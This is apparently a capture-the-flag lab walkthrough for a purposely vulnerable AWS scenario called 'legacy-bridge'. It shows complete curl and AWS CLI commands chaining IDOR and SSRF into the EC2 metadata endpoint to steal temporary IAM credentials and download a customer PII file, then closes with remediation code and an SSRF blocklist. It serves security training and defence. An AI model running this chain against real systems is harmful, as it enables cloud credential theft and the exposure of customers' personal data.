# legacy-bridge - Walkthrough

## Step 1: Reconnaissance

Access the web application and identify its functionality.

```bash
cd terraform
terraform output scenario_entrypoint_url
```

Open the URL in your browser to see the **Beaver Finance - Customer Portal**.

![Beaver Finance Initial Screen](./assets/image/legacy-bridge-initial-screen.png)

Key observations:
- Service name: "Beaver Finance - Customer Portal"
- Version: v5.0 production
- **Document Lookup** section with a Document number field and an optional Source URL field
- The Source URL field hints at a possible SSRF vector

---

## Step 2: Test Normal Functionality

Test the document lookup feature with a valid document number.

> **Note:** Document IDs 1–12 are pre-seeded. Any number in that range will return valid customer data.

### Method 1: Using Browser
1. Enter `1` in the Document number field
2. Leave Source URL empty
3. Click **Look up**
4. Verify the response contains customer data:
   - customer_name, application_id, file_name
   - `internal_source` field revealing a backend URL

### Method 2: Using CLI
```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1"
```

The document lookup is working normally.

---

## Step 3: Discover Vulnerability — IDOR

Test sequential document ID enumeration to check for IDOR.

### Method 1: Using Browser
1. Enter numbers 1 through 12 sequentially in the Document number field
2. Click **Look up** for each
3. Confirm you can access all customers' data without authorization

![IDOR Enumeration](./assets/image/legacy-bridge-idor-enumeration.png)

The response leaks a backend error revealing an internal hostname:

```
{"backend_response": "{'detail': 'HTTPConnectionPool(host='internal-media-cdn.legacy', port=80): Max retries exceeded..."}
```

### Method 2: Using CLI
```bash
GW=http://<gateway-ip>
for i in {1..12}; do
  curl -s "$GW/api/v5/legacy/media-info?file_id=$i"
done
```

**IDOR confirmed.** By incrementing `file_id`, any customer record is accessible. The `internal_source` field also exposes the internal backend hostname `internal-media-cdn.legacy`.

---

## Step 4: Discover Vulnerability — SSRF

The optional Source URL field is passed directly to the backend. Test whether arbitrary URLs can be injected.

### Method 1: Using Browser
1. Enter `1` in the Document number field
2. Enter `http://example.com` in the Source URL field
3. Click **Look up**
4. Confirm the response contains content fetched from `example.com`

![SSRF Confirmation](./assets/image/legacy-bridge-example.png)

### Method 2: Using CLI
```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://example.com"
```

**SSRF confirmed.** The `source` parameter is forwarded to the backend server, allowing requests to attacker-controlled URLs.

---

## Step 5: SSRF → Extract IAM Role Name via IMDSv1

Use the SSRF to query the EC2 Instance Metadata Service (IMDS) and enumerate available IAM roles.

### Method 1: Using Browser
1. Enter `1` in the Document number field
2. In the Source URL field, enter:
```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
3. Click **Look up**
4. Extract the role name from the `backend_response` field:
```
   legacy-bridge-Shadow-API-Role-<suffix>
```

### Method 2: Using CLI
```bash
GW=http://<gateway-ip>
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Save the role name for the next step.

---

## Step 6: Extract Temporary Credentials from IMDSv1

Query the role-specific IMDS endpoint to obtain temporary AWS credentials.

### Method 1: Using Browser
1. Enter `1` in the Document number field
2. In the Source URL field, use the role name from Step 5:
```
   http://169.254.169.254/latest/meta-data/iam/security-credentials/legacy-bridge-Shadow-API-Role-<suffix>
```
3. Click **Look up**

![IMDS Role Credential Extraction](./assets/image/legacy-bridge-imds-role-extraction.png)

The credentials are returned in the `backend_response` field:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-04-30T22:47:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-05-01T06:27:25Z"
}
```

### Method 2: Using CLI
```bash
GW=http://<gateway-ip>
ROLE="legacy-bridge-Shadow-API-Role-<suffix>"
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

**SSRF → IMDSv1 credential extraction confirmed.**  
Note: The Shadow API EC2 uses `http_tokens = "optional"` (IMDSv1 enabled), so no token prefetch is required.

---

## Step 7: AWS CLI Configuration

Set the temporary credentials obtained in Step 6 as environment variables.

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_DEFAULT_REGION="us-east-1"
```

Or configure as a profile:

```bash
aws configure --profile victim
aws configure set aws_session_token "..." --profile victim
```

---

## Step 8: Identity Verification

Verify the current credential identity.

```bash
aws sts get-caller-identity
```

Output:
```json
{
    "UserId": "AROAY5XXXXXXXXXXX:i-0xxxxxxxxxxxxxxx",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/legacy-bridge-Shadow-API-Role-<suffix>/i-0xxxxxxxxxxxxxxx"
}
```

Confirmed authentication as **Shadow API Role** (`legacy-bridge-Shadow-API-Role-<suffix>`).

---

## Step 9: IAM Permission Enumeration

Check what permissions the Shadow API Role has.

```bash
ROLE_NAME="legacy-bridge-Shadow-API-Role-<suffix>"

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME
```

Output:
```json
{
    "PolicyNames": [
        "legacy-bridge-shadow-api-s3-<suffix>"
    ]
}
```

An inline policy exists. Check its contents.

```bash
aws iam get-role-policy \
  --role-name $ROLE_NAME \
  --policy-name legacy-bridge-shadow-api-s3-<suffix>
```

Output:
```json
{
    "Statement": [
        {
            "Sid": "AllowDiscoverBuckets",
            "Effect": "Allow",
            "Action": ["s3:ListAllMyBuckets", "s3:GetBucketLocation"],
            "Resource": "*"
        },
        {
            "Sid": "AllowCheckOwnRolePermissions",
            "Effect": "Allow",
            "Action": ["iam:ListRolePolicies", "iam:GetRolePolicy"],
            "Resource": "arn:aws:iam::123456789012:role/legacy-bridge-Shadow-API-Role-<suffix>"
        },
        {
            "Sid": "AllowListPiiVault",
            "Effect": "Allow",
            "Action": ["s3:ListBucket"],
            "Resource": "arn:aws:s3:::legacy-bridge-pii-vault-<suffix>"
        },
        {
            "Sid": "AllowReadPiiVaultObjects",
            "Effect": "Allow",
            "Action": ["s3:GetObject"],
            "Resource": "arn:aws:s3:::legacy-bridge-pii-vault-<suffix>/*"
        }
    ]
}
```

**S3 read access to the PII vault bucket confirmed.**

```bash
# Check attached managed policies
aws iam list-attached-role-policies --role-name $ROLE_NAME
```

Output:
```json
{ "AttachedPolicies": [] }
```

No managed policies attached. Only the inline policy is in use.

---

## Step 10: S3 PII Vault Enumeration

List accessible S3 buckets and enumerate contents.

```bash
aws s3 ls
# → legacy-bridge-pii-vault-<suffix>

aws s3 ls s3://legacy-bridge-pii-vault-<suffix>/ --recursive
```

Output:
```
2026-05-01 00:00:00   applications/customer_credit_applications.csv
2026-05-01 00:00:00   applications/migration_log.txt
2026-05-01 00:00:00   applications/q1_2024_summary.txt
2026-05-01 00:00:00   confidential/breach_notice.txt
```

---

## Step 11: Exfiltrate Sensitive Data

Download the customer credit applications.

```bash
aws s3 cp s3://legacy-bridge-pii-vault-<suffix>/applications/customer_credit_applications.csv .
cat customer_credit_applications.csv
```

Output:
```
customer_id,name,ssn,email,phone,credit_score
001,John Doe,123-45-6789,john@example.com,555-1234,750
002,Jane Smith,987-65-4321,jane@example.com,555-5678,720
...
```

Thousands of customer records are exposed, each containing name, SSN, email, phone, and credit score.

---

## Step 12: Flag Extraction

Download the breach notice file.

```bash
aws s3 cp s3://legacy-bridge-pii-vault-<suffix>/confidential/breach_notice.txt -
```

The flag is included in the output.

---

## Attack Chain Summary

```
1. Beaver Finance Customer Portal (v5.0)
   ↓ IDOR via file_id parameter — sequential enumeration
2. Customer Data Leak
   ↓ internal_source field exposes backend hostname (internal-media-cdn.legacy)
3. SSRF via source parameter
   ↓ arbitrary URL forwarded to backend
4. IMDSv1 (169.254.169.254) — no token required
   ↓ enumerate IAM role: legacy-bridge-Shadow-API-Role-<suffix>
5. IMDSv1 Credential Extraction
   ↓ AccessKeyId, SecretAccessKey, Token
6. AWS CLI Configuration
   ↓ export as environment variables
7. sts:GetCallerIdentity
   ↓ confirm assumed role identity
8. iam:ListRolePolicies
   ↓ discover inline policy name
9. iam:GetRolePolicy
   ↓ S3 read access to legacy-bridge-pii-vault-<suffix> confirmed
10. s3:ListBucket + s3:GetObject
    ↓ enumerate and download PII vault contents
11. Flag extracted from confidential/breach_notice.txt
```

---

## Key Techniques

### IDOR Parameter Manipulation
```bash
for i in {1..12}; do
  curl -s "$GW/api/v5/legacy/media-info?file_id=$i"
done
```

### SSRF to IMDSv1
```bash
# Enumerate IAM roles
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Extract credentials
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

### IMDSv1 vs IMDSv2

| | IMDSv1 | IMDSv2 |
|---|---|---|
| Token Required | **No** | Yes (PUT prefetch) |
| Vulnerable to SSRF | **Yes** | No |
| Config | `http_tokens = "optional"` | `http_tokens = "required"` |

The Shadow API EC2 uses `http_tokens = "optional"`, making it directly exploitable via SSRF.

---

## Lessons Learned

### 1. Input Validation
- Validate `file_id` as a positive integer only
- Reject requests to RFC-1918 and link-local ranges from the `source` parameter
- Never trust user-supplied URLs for server-side fetching

### 2. Metadata Service Security
- Enforce IMDSv2 (`http_tokens = "required"`) on all EC2 instances
- Disable IMDSv1 completely

### 3. Least Privilege
- Avoid `s3:ListAllMyBuckets` with `Resource: "*"` unless explicitly required
- Scope IAM permissions to specific resource ARNs, not wildcard patterns

### 4. Defense in Depth
- Use AWS WAF to detect IDOR and SSRF patterns
- Enable CloudTrail logging for all S3 and IAM API calls
- Use GuardDuty to detect credential misuse and anomalous API activity

---

## Remediation

### Enforce IMDSv2
```hcl
metadata_options {
  http_tokens                 = "required"   # was "optional"
  http_endpoint               = "enabled"
  http_put_response_hop_limit = 1
}
```

### SSRF Input Validation
```python
from urllib.parse import urlparse
import ipaddress

BLOCKED_RANGES = [
    ipaddress.ip_network("169.254.0.0/16"),  # link-local / IMDS
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
]

def is_safe_url(url: str) -> bool:
    host = urlparse(url).hostname
    try:
        addr = ipaddress.ip_address(host)
        return not any(addr in net for net in BLOCKED_RANGES)
    except ValueError:
        return False  # non-IP hostname — resolve and recheck
```

### Authorization Check for Document Access
```python
def get_document(file_id: int, current_user_id: int):
    doc = db.query(Document).filter_by(id=file_id).first()
    if doc.owner_id != current_user_id:
        raise PermissionError("Access denied")
    return doc
```

### Additional Security Measures
1. **AWS WAF Rules**: Block SSRF patterns (private IP ranges, link-local addresses in `source` parameter)
2. **CloudTrail Monitoring**: Log all S3 GetObject/ListBucket calls on the PII vault bucket
3. **GuardDuty**: Detect IMDSv1 credential theft and unusual S3 data access patterns
4. **VPC Endpoint Policy**: Restrict S3 access to only the application's own bucket, deny access from outside the VPC